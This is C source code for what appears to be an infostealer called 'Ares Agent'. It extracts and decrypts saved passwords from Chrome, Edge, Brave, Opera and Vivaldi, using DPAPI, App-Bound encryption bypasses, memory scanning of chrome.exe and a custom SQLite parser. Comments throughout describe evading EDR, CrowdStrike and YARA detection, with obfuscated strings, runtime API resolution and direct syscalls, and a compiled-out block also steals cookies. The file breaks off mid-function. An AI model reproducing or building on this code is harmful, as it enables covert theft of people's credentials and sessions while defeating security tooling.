/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES AGENT — Native DPAPI + AES-GCM Chrome Credential Decrypt
 *
 *  Full pipeline in pure C:
 *    1. Read Local State → extract Base64 encrypted_key
 *    2. Base64 decode → strip "DPAPI" prefix
 *    3. CryptUnprotectData → AES-256-GCM master key
 *    4. Copy Login Data SQLite (bypass lock)
 *    5. Parse SQLite B-tree → extract records
 *    6. AES-256-GCM decrypt passwords (v10/v80 prefix)
 *
 *  NO sqlite3.dll, NO .NET, NO managed code.
 * ═══════════════════════════════════════════════════════════════
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>
/* #include <shlobj.h> — removed v3.0: CSIDL_ resolved via ares_resolve.h env emulation */
/* wincrypt.h / bcrypt.h — removed: types provided by ares_resolve.h manual defs (no IAT) */
#include "proc_enum.h" /* replaces tlhelp32 */
#include <winsock2.h>
#include <ws2tcpip.h>
/* #include <tlhelp32.h> — REMOVED v3.7: leftover include, creates IAT entries
 * for Toolhelp32 APIs that EDR flags. Use proc_enum.h instead. */

/* v2.1: Removed #pragma comment(lib) — APIs resolved at runtime
 * via ares_resolve.h to prevent IAT-based stealer classification.
 * Libraries still linked in Makefile for type definitions only. */

/* ── Base64 Decode (v2.1 — runtime resolved) ── */

static int b64_decode(const char* in, int in_len, BYTE* out, int out_max)
{
    if (!_resolve_crypt32()) return -1;
    DWORD out_len = (DWORD)out_max;
    if (!p_CryptStringToBinaryA(in, in_len, CRYPT_STRING_BASE64, out, &out_len, NULL, NULL))
        return -1;
    return (int)out_len;
}

/* ── DPAPI Decrypt (v2.1 — runtime resolved) ── */

static int dpapi_decrypt(const BYTE* encrypted, int enc_len, BYTE* decrypted, int dec_max)
{
    if (!_resolve_crypt32()) return -1;

    DATA_BLOB in_blob = { (DWORD)enc_len, (BYTE*)encrypted };
    DATA_BLOB out_blob = { 0 };

    if (!p_CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob))
        return -1;

    int copy_len = (int)out_blob.cbData;
    if (copy_len > dec_max) copy_len = dec_max;
    memcpy(decrypted, out_blob.pbData, copy_len);
    LocalFree(out_blob.pbData);

    return copy_len;
}

/* ── AES-256-GCM Decrypt (v2.1 — runtime resolved) ── */

static int aes_gcm_decrypt(const BYTE* key, int key_len,
    const BYTE* nonce, int nonce_len,
    const BYTE* ciphertext, int cipher_len,
    BYTE* plaintext, int plain_max)
{
    if (!_resolve_bcrypt()) return -1;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    int result = -1;

    status = p_BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (status != 0) return -1;

    status = p_BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status != 0) goto cleanup;

    status = p_BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
        (PUCHAR)key, key_len, 0);
    if (status != 0) goto cleanup;

    /* GCM: last 16 bytes of ciphertext is the auth tag */
    int tag_len = 16;
    if (cipher_len < tag_len) goto cleanup;

    int actual_cipher_len = cipher_len - tag_len;
    const BYTE* tag = ciphertext + actual_cipher_len;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = nonce_len;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = tag_len;
    authInfo.pbAuthData = NULL;
    authInfo.cbAuthData = 0;

    ULONG decrypted_len = 0;
    status = p_BCryptDecrypt(hKey, (PUCHAR)ciphertext, actual_cipher_len,
        &authInfo, NULL, 0, plaintext, plain_max, &decrypted_len, 0);

    if (status == 0)
        result = (int)decrypted_len;

cleanup:
    if (hKey) p_BCryptDestroyKey(hKey);
    if (hAlg) p_BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}

/* ── Chrome Master Key Extraction ── */

typedef struct _CHROME_KEY {
    BYTE key[32];    /* AES-256 key */
    int  key_len;
    BOOL valid;
} CHROME_KEY;

static CHROME_KEY extract_chrome_master_key(const char* local_state_path)
{
    CHROME_KEY result = { 0 };

    /* Read Local State file */
    HANDLE hFile = CreateFileA(local_state_path, GENERIC_READ,
        FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return result;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == 0 || size > 10 * 1024 * 1024) { CloseHandle(hFile); return result; }

    char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 1);
    if (!json) { CloseHandle(hFile); return result; }
    DWORD read;
    ReadFile(hFile, json, size, &read, NULL);
    CloseHandle(hFile);

    /* v2.1: Find encrypted_key marker (XOR-decoded at runtime) */
    char s_ek[32]; DEC_ENCRYPTED_KEY(s_ek);
    char search_key[64];
    snprintf(search_key, sizeof(search_key), "\"%s\":\"", s_ek);
    char* marker = strstr(json, search_key);
    if (!marker) { HeapFree(GetProcessHeap(), 0, json); return result; }

    marker += strlen(search_key);
    char* end = strchr(marker, '"');
    if (!end) { HeapFree(GetProcessHeap(), 0, json); return result; }

    int b64_len = (int)(end - marker);

    /* Base64 decode */
    BYTE decoded[1024];
    int decoded_len = b64_decode(marker, b64_len, decoded, sizeof(decoded));
    HeapFree(GetProcessHeap(), 0, json);

    if (decoded_len < 5) return result;

    /* Strip "DPAPI" prefix (5 bytes) — v2.1: compare XOR-decoded */
    char s_dpapi[16]; DEC_DPAPI(s_dpapi);
    if (memcmp(decoded, s_dpapi, 5) != 0) return result;

    BYTE* dpapi_blob = decoded + 5;
    int dpapi_len = decoded_len - 5;

    /* Try 1: Standard DPAPI decrypt (works for Chrome < 127) */
#ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try1 DPAPI...\n"); fflush(stderr);
#endif
    int key_len = dpapi_decrypt(dpapi_blob, dpapi_len, result.key, 32);
    if (key_len == 32) {
        result.key_len = 32;
        result.valid = TRUE;
        return result;
    }

    /* Try 2: v20 App-Bound Encryption (Chrome 127+)
     * The blob has App-Bound format — need IElevator COM or token impersonation.
     * Ares_DecryptV20 tries COM first, then impersonation fallback. */
#ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try2 V20 COM...\n"); fflush(stderr);
#endif
    extern int Ares_DecryptV20(const BYTE*, int, BYTE*, int);
    key_len = Ares_DecryptV20(dpapi_blob, dpapi_len, result.key, 32);
    if (key_len == 32) {
        result.key_len = 32;
        result.valid = TRUE;
        return result;
    }

    /* Try 3: App-Bound blob may have version header (4 bytes) — skip and retry */
#ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try3 strip header...\n"); fflush(stderr);
#endif
    if (dpapi_len > 36) {
        /* Some Chrome builds: version(4) + nonce(12) + encrypted_key + tag(16)
         * Try DPAPI on inner blob after stripping version byte */
        key_len = dpapi_decrypt(dpapi_blob + 4, dpapi_len - 4, result.key, 32);
        if (key_len == 32) {
            result.key_len = 32;
            result.valid = TRUE;
            return result;
        }
        /* Also try IElevator on stripped blob */
        key_len = Ares_DecryptV20(dpapi_blob + 4, dpapi_len - 4, result.key, 32);
        if (key_len == 32) {
            result.key_len = 32;
            result.valid = TRUE;
            return result;
        }
    }

    /* Try 4: ABE Policy Disable — REMOVED (FIX-09)
     * v3.7: This strategy modifies Chrome registry policy, kills Chrome,
     * deletes Local State, and relaunches Chrome. Every step triggers
     * CrowdStrike behavioral alerts. Compiled out of production builds.
     * Use ChromeKatz memory scan (Try 5) as next fallback instead. */
#ifdef ARES_INCLUDE_ABE_POLICY
#ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try4 ABE policy disable...\n"); fflush(stderr);
#endif
    extern BOOL disable_abe_policy(void);
    extern void restore_abe_policy(void);

    if (disable_abe_policy()) {
        /* Kill all Chrome processes via proc_enum */
        DWORD _cpids[32]; int _cn = proc_find_all("chrome.exe", _cpids, 32);
        for (int _ci = 0; _ci < _cn; _ci++) {
            HANDLE h = _nt_open_process(_cpids[_ci], PROCESS_TERMINATE);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
        }
        Sleep(2000);

        /* Delete Local State to force key regeneration */
        DeleteFileA(local_state_path);
        Sleep(500);

        /* Launch Chrome briefly to generate new key */
        char chromePath[MAX_PATH];
        _resolve_shell32();
        p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromePath);
        char chromeExe[MAX_PATH+128];
        snprintf(chromeExe, sizeof(chromeExe), 
            "%s\\Google\\Chrome\\Application\\chrome.exe", chromePath);

        STARTUPINFOA rsi = { sizeof(rsi) };
        rsi.dwFlags = STARTF_USESHOWWINDOW; rsi.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION rpi = {0};
        char rCmd[1024];
        snprintf(rCmd, sizeof(rCmd), 
            "\"%s\" --headless=new --disable-gpu --no-first-run --disable-sync "
            "--window-position=-32000,-32000", chromeExe);
        if (CreateProcessA(NULL, rCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &rsi, &rpi)) {
            Sleep(5000);
            TerminateProcess(rpi.hProcess, 0);
            WaitForSingleObject(rpi.hProcess, 3000);
            CloseHandle(rpi.hProcess); CloseHandle(rpi.hThread);
        }

        /* Re-read Local State and try DPAPI again */
        HANDLE hF2 = CreateFileA(local_state_path, GENERIC_READ,
            FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hF2 != INVALID_HANDLE_VALUE) {
            DWORD sz2 = GetFileSize(hF2, NULL);
            if (sz2 > 0 && sz2 < 10*1024*1024) {
                char* json2 = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz2+1);
                if (json2) {
                DWORD rd2;
                ReadFile(hF2, json2, sz2, &rd2, NULL);
                CloseHandle(hF2);
                char* mk2 = strstr(json2, search_key);
                if (mk2) {
                    mk2 += strlen(search_key);
                    char* e2 = strchr(mk2, '"');
                    if (e2) {
                        int bl2 = (int)(e2 - mk2);
                        BYTE dec2[1024];
                        int dl2 = b64_decode(mk2, bl2, dec2, sizeof(dec2));
                        if (dl2 > 5 && memcmp(dec2, s_dpapi, 5) == 0) {
                            key_len = dpapi_decrypt(dec2+5, dl2-5, result.key, 32);
                            if (key_len == 32) {
                                result.key_len = 32;
                                result.valid = TRUE;
                            }
                        }
                    }
                }
                } /* end if (json2) */
                HeapFree(GetProcessHeap(), 0, json2);
            } else {
                CloseHandle(hF2);
            }
        }

        /* Clean up policy */
        restore_abe_policy();

        if (result.valid) return result;
    }
#endif /* ARES_INCLUDE_ABE_POLICY */

    /* Try 5: ChromeKatz — scan chrome.exe memory for decrypted BCrypt AES-256 key
     * Chrome holds the plaintext key in BCrypt key objects with "MSSK" header.
     * This works regardless of App-Bound encryption version. */
#ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try5 ChromeKatz mem scan...\n"); fflush(stderr);
#endif
    {
        BYTE scanned_key[32];
        int sk = Ares_ChromeScanKeyW32(scanned_key, 32);
        if (sk == 32) {
            memcpy(result.key, scanned_key, 32);
            result.key_len = 32;
            result.valid = TRUE;
        #ifdef ARES_DEBUG
    fprintf(stderr, "[KEY] Try5 SUCCESS\n"); fflush(stderr);
#endif
            return result;
        }
    }

    return result;
}

/* ── SQLite B-Tree Parser (Minimal) ── */

typedef struct _SQLITE_RECORD {
    char url[512];
    char username[256];
    BYTE encrypted_password[1024];
    int  password_len;
} SQLITE_RECORD;

/* Read a varint from SQLite format */
static int read_varint(const BYTE* data, int offset, int max, INT64* value)
{
    *value = 0;
    int bytes = 0;
    for (int i = 0; i < 9 && offset + i < max; i++) {
        if (i < 8) {
            *value = (*value << 7) | (data[offset + i] & 0x7F);
            bytes++;
            if ((data[offset + i] & 0x80) == 0) break;
        } else {
            *value = (*value << 8) | data[offset + i];
            bytes++;
        }
    }
    return bytes;
}

/* Extract text field from SQLite record payload */
static int extract_text_field(const BYTE* payload, int offset, int len, char* out, int max)
{
    int copy = (len < max - 1) ? len : max - 1;
    memcpy(out, payload + offset, copy);
    out[copy] = '\0';
    return copy;
}

/* Parse a leaf cell in a B-tree leaf page */
static int parse_btree_leaf_cell(const BYTE* page, int cell_offset, int page_size,
    SQLITE_RECORD* records, int max_records, int* record_count,
    int idx_url, int idx_user, int idx_pass)
{
    const BYTE* cell = page + cell_offset;
    int pos = 0;

    /* Payload length */
    INT64 payload_len;
    pos += read_varint(cell, pos, page_size - cell_offset, &payload_len);

    /* Row ID */
    INT64 rowid;
    pos += read_varint(cell, pos, page_size - cell_offset, &rowid);

    if (payload_len <= 0 || payload_len > page_size * 2) return pos + (int)payload_len;

    /* Bounds: don't read past end of page */
    int avail = page_size - cell_offset - pos;
    if ((int)payload_len > avail) payload_len = avail;

    /* Record header */
    const BYTE* payload = cell + pos;
    int hdr_pos = 0;
    INT64 header_len;
    hdr_pos += read_varint(payload, hdr_pos, (int)payload_len, &header_len);

    /* Parse column types */
    INT64 col_types[20] = { 0 };
    int num_cols = 0;
    while (hdr_pos < (int)header_len && num_cols < 20) {
        hdr_pos += read_varint(payload, hdr_pos, (int)payload_len, &col_types[num_cols]);
        num_cols++;
    }

    /* Need enough columns for the indices we're reading */
    int min_cols = idx_pass + 1;
    if (idx_url >= min_cols) min_cols = idx_url + 1;
    if (idx_user >= min_cols) min_cols = idx_user + 1;
    if (num_cols < min_cols || *record_count >= max_records) return pos + (int)payload_len;

    /* Calculate data offsets */
    int data_offset = (int)header_len;
    int col_offsets[20] = { 0 };
    int col_sizes[20] = { 0 };

    for (int c = 0; c < num_cols; c++) {
        col_offsets[c] = data_offset;
        INT64 t = col_types[c];
        if (t == 0) col_sizes[c] = 0;          /* NULL */
        else if (t >= 1 && t <= 4) col_sizes[c] = (int)t; /* int */
        else if (t == 5) col_sizes[c] = 6;      /* int48 */
        else if (t == 6) col_sizes[c] = 8;      /* int64 */
        else if (t == 7) col_sizes[c] = 8;      /* float */
        else if (t >= 12 && t % 2 == 0) col_sizes[c] = (int)(t - 12) / 2; /* blob */
        else if (t >= 13 && t % 2 == 1) col_sizes[c] = (int)(t - 13) / 2; /* text */
        data_offset += col_sizes[c];
    }

    /* Extract fields using schema-derived column indices */
    SQLITE_RECORD* rec = &records[*record_count];
    memset(rec, 0, sizeof(SQLITE_RECORD));

    /* origin_url */
    if (idx_url < num_cols && col_sizes[idx_url] > 0 && col_types[idx_url] >= 13
        && col_offsets[idx_url] + col_sizes[idx_url] <= (int)payload_len)
        extract_text_field(payload, col_offsets[idx_url], col_sizes[idx_url], rec->url, sizeof(rec->url));

    /* username_value */
    if (idx_user < num_cols && col_sizes[idx_user] > 0 && col_types[idx_user] >= 13
        && col_offsets[idx_user] + col_sizes[idx_user] <= (int)payload_len)
        extract_text_field(payload, col_offsets[idx_user], col_sizes[idx_user], rec->username, sizeof(rec->username));

    /* password_value (blob) */
    if (idx_pass < num_cols && col_sizes[idx_pass] > 0
        && col_offsets[idx_pass] + col_sizes[idx_pass] <= (int)payload_len) {
        rec->password_len = col_sizes[idx_pass];
        if (rec->password_len > (int)sizeof(rec->encrypted_password))
            rec->password_len = (int)sizeof(rec->encrypted_password);
        memcpy(rec->encrypted_password, payload + col_offsets[idx_pass], rec->password_len);
    }

    /* Only count if we got meaningful data */
    if (rec->url[0] != '\0' && rec->password_len > 0)
        (*record_count)++;

    return pos + (int)payload_len;
}

/* ── Chromelevator v20 Bypass (DISABLED — FIX-10) ──
 * v3.7: REMOVED from production builds. This dead code was never called
 * in v3.6+ but its string references (chromelevator_x64.exe, passwords.json)
 * created YARA signature matches in the binary. Compile with
 * -DARES_INCLUDE_CHROMELEVATOR to include for legacy compatibility.
 */
#ifdef ARES_INCLUDE_CHROMELEVATOR
/* Minimal JSON string value parser:  "key":"value" */
static int _json_str(const char* json, const char* key, char* out, int max) {
    char needle[64];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    char* p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    int i = 0;
    while (*p && *p != '"' && i < max - 1) {
        if (*p == '\\' && *(p+1)) { p++; } /* skip escape */
        out[i++] = *p++;
    }
    out[i] = '\0';
    return i;
}

static int _find_tool(char* out, int max) {
    char modPath[MAX_PATH];
    GetModuleFileNameA(NULL, modPath, MAX_PATH);
    char* slash = strrchr(modPath, '\\');
    if (slash) *slash = '\0';

    /* Decode tool name at runtime */
    char toolName[32]; DEC_CHROMELEVATOR_EXE(toolName);
    char subDir[48];
    char _sd[32]; DEC_CHROMELEVATOR_EXE(_sd); snprintf(subDir, sizeof(subDir), "%s", _sd); /* v3.4: no hardcoded path */

    snprintf(out, max, "%s\\%s", modPath, subDir);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 1;

    snprintf(out, max, "%s\\..\\%s", modPath, subDir);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 1;

    snprintf(out, max, "%s", subDir);
    if (GetFileAttributesA(out) != INVALID_FILE_ATTRIBUTES) return 1;

    return 0;
}

/* v3.2: Silent recursive directory removal via Win32 API.
 * Replaces system("rmdir /s /q") which spawned cmd.exe and
 * generated ETW process creation events — instant EDR alert. */
static void _rmdir_recursive(const char* dirPath) {
    char searchPath[MAX_PATH + 4];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", dirPath);
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == '.' && (fd.cFileName[1] == '\0' ||
            (fd.cFileName[1] == '.' && fd.cFileName[2] == '\0')))
            continue;
        char fullPath[MAX_PATH + 64];
        snprintf(fullPath, sizeof(fullPath), "%s\\%s", dirPath, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            _rmdir_recursive(fullPath);
        } else {
            SetFileAttributesA(fullPath, FILE_ATTRIBUTE_NORMAL);
            DeleteFileA(fullPath);
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
    RemoveDirectoryA(dirPath);
}

int Ares_ChromelevatorSteal(DECRYPTED_CRED* creds, int max_creds,
                            STOLEN_COOKIE* cookies, int max_cookies,
                            int* out_cookie_count)
{
    if (out_cookie_count) *out_cookie_count = 0;
    /* v3.3: chromelevator bundled by builder in tools/chromelevator/ */
    int pw_count = 0;
    int ck_count = 0;

    char toolPath[MAX_PATH];
    if (!_find_tool(toolPath, MAX_PATH)) {
    #ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] chromelevator not found\n"); fflush(stderr);
#endif
        return 0;
    }
#ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] found: %s\n", toolPath); fflush(stderr);
#endif

    /* Output dir */
    char outDir[MAX_PATH];
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    snprintf(outDir, MAX_PATH, "%smdc_%08x", tmp, GetCurrentProcessId() ^ GetTickCount());

    /* v3.2: Silent cleanup via Win32 API (no cmd.exe spawn) */
    _rmdir_recursive(outDir);

    /* Launch: chromelevator_x64.exe -o <outdir> chrome */
    char cmdLine[MAX_PATH * 2];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" -o \"%s\" chrome", toolPath, outDir);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

#ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] launching: %s\n", cmdLine); fflush(stderr);
#endif
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    #ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] CreateProcess failed: %lu\n", GetLastError()); fflush(stderr);
#endif
        return 0;
    }

    /* Wait up to 30 seconds */
    WaitForSingleObject(pi.hProcess, 30000);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
#ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] chromelevator done\n"); fflush(stderr);
#endif

    /* Parse output: <outdir>\Chrome\<Profile>\passwords.json */
    char chromeDir[MAX_PATH];
    snprintf(chromeDir, MAX_PATH, "%s\\Chrome", outDir);

    WIN32_FIND_DATAA fd;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", chromeDir);
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
    #ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] no Chrome profiles in output\n"); fflush(stderr);
#endif
        return 0;
    }

    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == '.') continue;

        char profileName[64];
        strncpy(profileName, fd.cFileName, 63);

        /* ── Read passwords.json ── */
        char _pw_fn[16]; DEC_PASSWORDS_JSON(_pw_fn);
        char pwPath[MAX_PATH + 64];
        snprintf(pwPath, sizeof(pwPath), "%s\\%s\\%s", chromeDir, fd.cFileName, _pw_fn);

        HANDLE hPw = CreateFileA(pwPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hPw != INVALID_HANDLE_VALUE) {
            DWORD sz = GetFileSize(hPw, NULL);
            if (sz > 0 && sz < 4*1024*1024) {
                char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz + 1);
                DWORD rd; ReadFile(hPw, json, sz, &rd, NULL);
                CloseHandle(hPw);

                /* Parse JSON array: [{"url":"...","user":"...","pass":"..."}, ...] */
                char* p = json;
                while ((p = strstr(p, "{\"")) != NULL && pw_count < max_creds) {
                    char* end = strchr(p + 1, '}');
                    if (!end) break;

                    /* Temporarily null-terminate this object */
                    char saved = *(end + 1);
                    *(end + 1) = '\0';

                    DECRYPTED_CRED* c = &creds[pw_count];
                    memset(c, 0, sizeof(DECRYPTED_CRED));
                    _json_str(p, "url", c->url, sizeof(c->url));
                    _json_str(p, "user", c->username, sizeof(c->username));
                    _json_str(p, "pass", c->password, sizeof(c->password));
                    strncpy(c->browser, "Chrome", sizeof(c->browser) - 1);
                    strncpy(c->profile, profileName, sizeof(c->profile) - 1);

                    if (c->url[0] || c->username[0]) {
                        strncpy(c->decrypt_status,
                            c->password[0] ? "ok" : "empty", 15);
                        pw_count++;
                    }

                    *(end + 1) = saved;
                    p = end + 1;
                }
                HeapFree(GetProcessHeap(), 0, json);
            } else {
                CloseHandle(hPw);
            }
        }

        /* ── Read cookies.json ── */
        if (cookies && max_cookies > 0) {
            char _ck_fn[16]; DEC_COOKIES_JSON(_ck_fn);
            char ckPath[MAX_PATH + 64];
            snprintf(ckPath, sizeof(ckPath), "%s\\%s\\%s", chromeDir, fd.cFileName, _ck_fn);

            HANDLE hCk = CreateFileA(ckPath, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, 0, NULL);
            if (hCk != INVALID_HANDLE_VALUE) {
                DWORD sz = GetFileSize(hCk, NULL);
                if (sz > 0 && sz < 8*1024*1024) {
                    char* json = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz + 1);
                    DWORD rd; ReadFile(hCk, json, sz, &rd, NULL);
                    CloseHandle(hCk);

                    char* p = json;
                    while ((p = strstr(p, "{\"")) != NULL && ck_count < max_cookies) {
                        char* end = strchr(p + 1, '}');
                        if (!end) break;
                        char saved = *(end + 1);
                        *(end + 1) = '\0';

                        STOLEN_COOKIE* ck = &cookies[ck_count];
                        memset(ck, 0, sizeof(STOLEN_COOKIE));
                        _json_str(p, "host", ck->host, sizeof(ck->host));
                        if (!ck->host[0]) _json_str(p, "domain", ck->host, sizeof(ck->host));
                        _json_str(p, "name", ck->name, sizeof(ck->name));
                        _json_str(p, "value", ck->value, sizeof(ck->value));
                        _json_str(p, "path", ck->path, sizeof(ck->path));
                        strncpy(ck->browser, "Chrome", sizeof(ck->browser) - 1);

                        if (ck->host[0] || ck->name[0]) ck_count++;

                        *(end + 1) = saved;
                        p = end + 1;
                    }
                    HeapFree(GetProcessHeap(), 0, json);
                } else {
                    CloseHandle(hCk);
                }
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);

#ifdef ARES_DEBUG
    fprintf(stderr, "[ELV] result: %d passwords, %d cookies\n", pw_count, ck_count); fflush(stderr);
#endif
    if (out_cookie_count) *out_cookie_count = ck_count;

    /* v3.2: Silent cleanup via Win32 API (no cmd.exe spawn) */
    _rmdir_recursive(outDir);

    return pw_count;
}
#endif /* ARES_INCLUDE_CHROMELEVATOR */

/* ── Main Export: Full Chrome Password Steal ── */
/* DECRYPTED_CRED defined in ares_agent.h */

int Ares_StealChromeCreds(DECRYPTED_CRED* creds, int max_creds)
{
    int count = 0;
    char localAppData[MAX_PATH];
#ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] enter\n"); fflush(stderr);
#endif
    _resolve_shell32(); p_SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData);
#ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] localAppData=%s\n", localAppData); fflush(stderr);
#endif

    /* v2.1: Browser paths decoded from XOR at runtime (not in .rdata) */
    char s_chrome[64], s_edge[64], s_brave[64], s_opera[64], s_vivaldi[64];
    DEC_BR_CHROME(s_chrome);    /* "Google\\Chrome\\User Data" */
    DEC_BR_EDGE(s_edge);
    DEC_BR_BRAVE(s_brave);
    DEC_BR_OPERA(s_opera);
    DEC_BR_VIVALDI(s_vivaldi);

    /* v3.0: Browser name labels also encrypted */
    char n_chrome[16], n_edge[16], n_brave[16], n_opera[16], n_vivaldi[16];
    DEC_LABEL_CHROME(n_chrome); DEC_LABEL_EDGE(n_edge);
    DEC_LABEL_BRAVE(n_brave); DEC_LABEL_OPERA(n_opera); DEC_LABEL_VIVALDI(n_vivaldi);

    struct { const char* name; const char* subdir; } browsers[] = {
        { n_chrome,  s_chrome },
        { n_edge,    s_edge },
        { n_brave,   s_brave },
        { n_opera,   s_opera },
        { n_vivaldi, s_vivaldi },
        { NULL, NULL }
    };

    for (int b = 0; browsers[b].name != NULL; b++) {
        char userDataDir[MAX_PATH];
        snprintf(userDataDir, MAX_PATH, "%s\\%s", localAppData, browsers[b].subdir);

        /* Check if browser exists */
        char localStatePath[MAX_PATH + 64];
        char s_ls[32]; DEC_LOCAL_STATE(s_ls);
        snprintf(localStatePath, sizeof(localStatePath), "%s\\%s", userDataDir, s_ls);

        if (GetFileAttributesA(localStatePath) == INVALID_FILE_ATTRIBUTES)
            continue;

    #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] browser[%d] found: %s\n", b, localStatePath); fflush(stderr);
#endif
        /* Extract master key */
        CHROME_KEY masterKey = extract_chrome_master_key(localStatePath);
    #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] masterKey.valid=%d\n", masterKey.valid); fflush(stderr);
#endif
        if (!masterKey.valid) continue;

        /* Enumerate profiles: Default, Profile 1, Profile 2, ... */
        char s_def[16],s_p1[16],s_p2[16],s_p3[16],s_p4[16],s_p5[16];
        DEC_DEFAULT(s_def); DEC_PROF_1(s_p1); DEC_PROF_2(s_p2);
        DEC_PROF_3(s_p3); DEC_PROF_4(s_p4); DEC_PROF_5(s_p5);
        const char* profiles[] = { s_def, s_p1, s_p2, s_p3, s_p4, s_p5, NULL };
    #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] profiles decoded, entering loop...\n"); fflush(stderr);
#endif

        for (int p = 0; profiles[p] != NULL && count < max_creds; p++) {
        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] profile[%d]=%s\n", p, profiles[p]); fflush(stderr);
#endif
            char loginDataPath[MAX_PATH + 128];
            char s_ld[32]; DEC_LOGIN_DATA(s_ld);
            snprintf(loginDataPath, sizeof(loginDataPath),
                "%s\\%s\\%s", userDataDir, profiles[p], s_ld);

            if (GetFileAttributesA(loginDataPath) == INVALID_FILE_ATTRIBUTES)
                continue;

        #ifdef ARES_DEBUG
    fprintf(stderr, "[STEAL] found loginData: %s\n", loginDataPath); fflush(stderr);
#endif
            /* v5.0 FIX: Read Login Data DIRECTLY via NtCreateFile+NtReadFile syscall.
             * NO CopyFileA, NO temp file on disk, NO DeleteFileA.
             * NtCreateFile with FILE_SHARE_ALL bypasses Chrome's file lock.
             * EDR cannot see this — goes through ntdll .text via Tartarus' Gate. */
            HANDLE hDb = NULL;
            NTSTATUS ntStatus = Ares_NtCreateFile(&hDb,
                0x80100000, /* FILE_GENERIC_READ */
                loginDataPath,
                7, /* FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE */
                1, /* FILE_OPEN (OPEN_EXISTING) */
                0x00000060 /* FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE */
            );
            if (ntStatus != 0 || !hDb) {
                /* Absolute fallback if syscall fails */
                hDb = CreateFileA(loginDataPath, GENERIC_READ,
                    FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, 0, NULL);
                if (hDb == INVALID_HANDLE_VALUE) continue;
            }

            /* Get file size */
            LARGE_INTEGER fileSize;
            fileSize.QuadPart = 0;
            Ares_NtQueryInformationFile(hDb, &fileSize);
            DWORD dbSize = (DWORD)fileSize.QuadPart;
            if (dbSize == 0) dbSize = GetFileSize(hDb, NULL);
